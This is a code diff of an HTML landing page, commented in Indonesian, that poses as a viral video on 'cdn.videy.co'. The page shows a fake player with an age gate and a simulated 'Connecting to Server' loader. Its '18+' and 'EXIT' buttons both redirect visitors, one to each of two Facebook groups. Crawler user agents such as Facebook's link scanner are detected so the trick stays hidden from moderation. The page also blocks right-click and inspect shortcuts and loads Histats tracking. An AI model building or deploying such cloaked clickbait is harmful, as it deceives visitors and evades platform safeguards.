@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Videy - Premium Streaming</title>
     
-    <!-- MANIPULASI TAMPILAN FACEBOOK -->
+    <!-- MANIPULASI TAMPILAN SOSIAL MEDIA -->
     <meta property="og:site_name" content="CDN.VIDEY.CO" />
     <meta property="og:title" content="Video_Viral.mp4" /> 
     <meta property="og:description" content="Video • 4.8 MB • 1080p • Full HD" />
@@ -19,7 +19,6 @@
     <script src="https://unpkg.com/lucide@latest"></script>
 
     <style>
-        /* Anti Block & Anti Copy Paste */
         body { 
             background-color: #f3f4f6; 
             color: #111827; 
@@ -38,21 +37,26 @@
         
         ::-webkit-scrollbar { display: none; }
         
-        /* Animasi Kedap-Kedip Tombol Lembut */
-        .blink-btn { animation: blinker 0.7s infinite alternate; }
+        /* Animasi Kedap-Kedip Tombol */
+        .blink-btn { animation: blinker 0.8s infinite alternate; }
         @keyframes blinker { 
             0% { opacity: 1; transform: scale(1); }
-            100% { opacity: 0.85; transform: scale(0.96); box-shadow: 0 0 10px rgba(0,0,0,0.1); } 
+            100% { opacity: 0.9; transform: scale(0.97); box-shadow: 0 0 15px rgba(0,0,0,0.1); } 
+        }
+
+        /* Nonaktifkan interaksi pada overlay play */
+        .no-click {
+            pointer-events: none;
+            cursor: default;
         }
     </style>
 </head>
-<!-- Anti Klik Kanan di Body -->
 <body class="min-h-screen flex flex-col items-center justify-center p-4 font-sans bg-gray-100" oncontextmenu="return false;">
 
-    <!-- Wrapper Utama: Berupa "KARTU" yang berada di tengah layar, bayangan tajam -->
+    <!-- Wrapper Utama -->
     <div class="w-full max-w-md bg-white border border-gray-200 rounded-2xl overflow-hidden relative shadow-2xl flex flex-col">
         
-        <!-- Top Bar Player (Mengambang di atas video) -->
+        <!-- Top Bar Player -->
         <div class="absolute top-0 left-0 w-full z-30 p-4 bg-gradient-to-b from-black/80 to-transparent flex justify-between items-center pointer-events-none">
             <div class="flex items-center space-x-2 opacity-95">
                 <div class="bg-red-600 rounded-md p-1 shadow-md">
@@ -65,114 +69,112 @@
             </div>
         </div>
 
-        <!-- VIDEO CONTAINER (Tinggi Fix 55% Layar, Maksimal 450px agar tombol pasti terlihat) -->
+        <!-- VIDEO CONTAINER -->
         <div class="relative w-full h-[55vh] max-h-[450px] min-h-[300px] bg-black overflow-hidden group flex items-center justify-center border-b border-gray-800">
             
-            <!-- Video ini HANYA menampilkan cuplikan frame, dibikin redup elegan -->
-            <video id="vidThumb" class="w-full h-full object-contain opacity-80" playsinline preload="metadata" muted></video>
+            <!-- Video Preview -->
+            <video id="vidThumb" class="w-full h-full object-contain opacity-70" playsinline preload="metadata" muted></video>
 
             <!-- PLAY OVERLAY -->
-            <div id="clickTarget1" class="absolute inset-0 flex flex-col items-center justify-center bg-black/10 cursor-pointer z-20 hover:bg-black/30 transition duration-300">
-                <div class="relative pulse mb-4 transition-transform group-hover:scale-110">
-                    <div class="w-22 h-22 sm:w-24 sm:h-24 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(220,38,38,0.8)] border-4 border-white/90 p-5 sm:p-6">
+            <div class="absolute inset-0 flex flex-col items-center justify-center bg-black/20 z-20 no-click">
+                <div class="relative pulse mb-4">
+                    <div class="w-22 h-22 sm:w-24 sm:h-24 bg-red-600/90 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(220,38,38,0.6)] border-4 border-white/80 p-5">
                         <i data-lucide="play" class="w-10 h-10 sm:w-12 sm:h-12 text-white fill-white ml-2"></i>
                     </div>
                 </div>
-                <p class="text-white font-black text-lg sm:text-xl drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)] tracking-wide">TAP TO PLAY</p>
-                <p id="warnBox" class="text-red-400 text-xs font-bold mt-2 hidden bg-black/80 px-3 py-1 rounded border border-red-500/30">Video Not Found</p>
+                <p class="text-white font-black text-lg sm:text-xl drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)] tracking-wide">VERIFICATION REQUIRED</p>
+                <p id="warnBox" class="text-red-400 text-xs font-bold mt-2 hidden bg-black/80 px-3 py-1 rounded border border-red-500/30 text-center">Video Locked.<br/>Please verify your age below.</p>
             </div>
             
             <!-- Loader Palsu -->
-            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black/90 z-30 backdrop-blur-sm">
+            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-black/95 z-40 backdrop-blur-sm">
                 <div class="flex flex-col items-center">
                     <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-b-4 border-red-600 mb-4 shadow-[0_0_15px_rgba(220,38,38,0.5)]"></div>
-                    <span class="text-white text-sm font-bold animate-pulse tracking-widest uppercase">Connecting...</span>
+                    <span class="text-white text-sm font-bold animate-pulse tracking-widest uppercase">Connecting to Server...</span>
                 </div>
             </div>
         </div>
 
-        <!-- BOTTOM ACTION AREA (Bagian Putih Terang dengan 2 Tombol) -->
-        <!-- Karena video max 55vh, area putih ini dijamin langsung terlihat di layar HP -->
+        <!-- BOTTOM ACTION AREA -->
         <div class="w-full bg-white p-4 sm:p-5 flex flex-row items-center justify-center space-x-3 sm:space-x-4 relative">
             
-            <!-- TOMBOL 18+ (Kiri) -->
-            <div id="btn18" class="flex-1 flex items-center justify-center py-4 bg-green-600 hover:bg-green-500 text-white font-black text-[14px] sm:text-[16px] rounded-xl shadow-[0_4px_15px_rgba(22,163,74,0.4)] uppercase tracking-wider border-b-4 border-green-800 cursor-pointer blink-btn transition-colors">
+            <!-- TOMBOL 18+ (HIJAU) -->
+            <div id="btn18" class="flex-1 flex items-center justify-center py-4 bg-green-600 hover:bg-green-500 text-white font-black text-[14px] sm:text-[16px] rounded-xl shadow-[0_4px_15px_rgba(22,163,74,0.3)] uppercase tracking-wider border-b-4 border-green-800 cursor-pointer blink-btn transition-all active:scale-95">
                 🔞 I AM 18+
             </div>
             
-            <!-- TOMBOL EXIT (Kanan) -->
-            <div id="btnExit" class="flex-1 flex items-center justify-center py-4 bg-red-600 hover:bg-red-500 text-white font-black text-[14px] sm:text-[16px] rounded-xl shadow-[0_4px_15px_rgba(220,38,38,0.4)] uppercase tracking-wider border-b-4 border-red-900 cursor-pointer blink-btn transition-colors">
+            <!-- TOMBOL EXIT (BIRU) -->
+            <div id="btnExit" class="flex-1 flex items-center justify-center py-4 bg-blue-600 hover:bg-blue-500 text-white font-black text-[14px] sm:text-[16px] rounded-xl shadow-[0_4px_15px_rgba(37,99,235,0.3)] uppercase tracking-wider border-b-4 border-blue-900 cursor-pointer transition-all active:scale-95">
                 <i data-lucide="x-octagon" class="mr-1.5 h-5 w-5"></i> EXIT
             </div>
 
         </div>
     </div>
 
-    <!-- LOGIC SCRIPT: REDIRECT KE WEBSITE UTAMA -->
+    <!-- Script Logic -->
     <script>
         lucide.createIcons();
 
-        // 1. SECURITY & BOT DETECTION (Anti Clone & Anti Maling)
+        // 1. Anti Bot & Security
         const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit/i.test(navigator.userAgent);
-        
         if (!isBot) {
-            // Matikan Klik Kanan
-            document.addEventListener('contextmenu', event => event.preventDefault()); 
-            
-            // Matikan Shortcut Inspect Element (F12, Ctrl+U, Ctrl+Shift+I/J/C)
+            document.addEventListener('contextmenu', event => event.preventDefault());
             document.onkeydown = function(e) {
-                if(e.keyCode == 123) { return false; } 
-                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) { return false; }
-                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; }
+                if(e.keyCode == 123) return false;
+                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
             }
         }
 
-        // 2. MENGAMBIL ID DARI URL PATH 
-        let id = window.location.pathname.split('/').pop().trim();
-        if (id === "index.html") id = "";
-        
-        const ok = /^[a-zA-Z0-9_.-]{3,80}$/.test(id);
+        // 2. Definisi URL Tujuan
+        const URL_HIJAU = "https://www.facebook.com/groups/moodxsweet";
+        const URL_BIRU = "https://www.facebook.com/groups/paizonx";
 
-        const warnBox = document.getElementById("warnBox");
-        const vdThumb = document.getElementById("vidThumb");
-        const target1 = document.getElementById("clickTarget1");
         const btn18 = document.getElementById("btn18");
         const btnExit = document.getElementById("btnExit");
         const loader = document.getElementById("loader");
+        const vdThumb = document.getElementById("vidThumb");
+        const warnBox = document.getElementById("warnBox");
 
-        // 3. FUNGSI LEMPAR KE WEBSITE UTAMA (mov.vidley.pw) 
-        function redirectToMainWeb() {
-            // Jika bot FB yang klik atau ID tidak ada, abaikan
-            if(isBot || !ok) return; 
-            
-            // Tampilkan animasi loading palsu agar meyakinkan
-            target1.classList.add('hidden');
+        // Fungsi Navigasi
+        function navigateTo(url) {
+            if(isBot) return;
             loader.classList.remove('hidden');
-
-            // Redirect ke Web Utama setelah 800 milidetik
             setTimeout(() => {
-                window.location.href = "https://mov.vidley.pw/" + encodeURIComponent(id);
-            }, 800);
+                window.location.href = url;
+            }, 1000);
         }
 
-        // 4. SET THUMBNAIL VIDEO DARI VIDEY
-        if(!ok){
-            warnBox.classList.remove('hidden');
-        } else {
+        // Event Listeners untuk masing-masing tombol
+        btn18.addEventListener("click", () => navigateTo(URL_HIJAU));
+        btnExit.addEventListener("click", () => navigateTo(URL_BIRU));
+
+        // 3. Load Thumbnail Videy
+        let id = window.location.pathname.split('/').pop().trim();
+        if (id === "index.html" || id === "") id = "default"; 
+        const ok = /^[a-zA-Z0-9_.-]{3,80}$/.test(id);
+
+        if(ok && id !== "default"){
             let filename = id.includes('.') ? id : id + ".mp4";
-            
-            // Mengambil cuplikan frame dari detik ke-1.0 (#t=1.0)
-            vdThumb.src = "https://cdn.videy.co/" + encodeURIComponent(filename) + "#t=1.0";
+            vdThumb.src = "https://cdn.videy.co/" + encodeURIComponent(filename) + "#t=0.5";
             vdThumb.addEventListener("loadeddata", () => {
                 try { vdThumb.pause(); } catch(e){}
             });
+        } else {
+            warnBox.classList.remove('hidden');
         }
 
-        // KETIKA PENGUNJUNG KLIK TOMBOL MANAPUN -> LANGSUNG MENUJU WEB UTAMA
-        target1.addEventListener("click", redirectToMainWeb);
-        btn18.addEventListener("click", redirectToMainWeb);
-        btnExit.addEventListener("click", redirectToMainWeb);
-
     </script>
+
+    <!-- Histats -->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,4889367,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
 </body>
 </html>
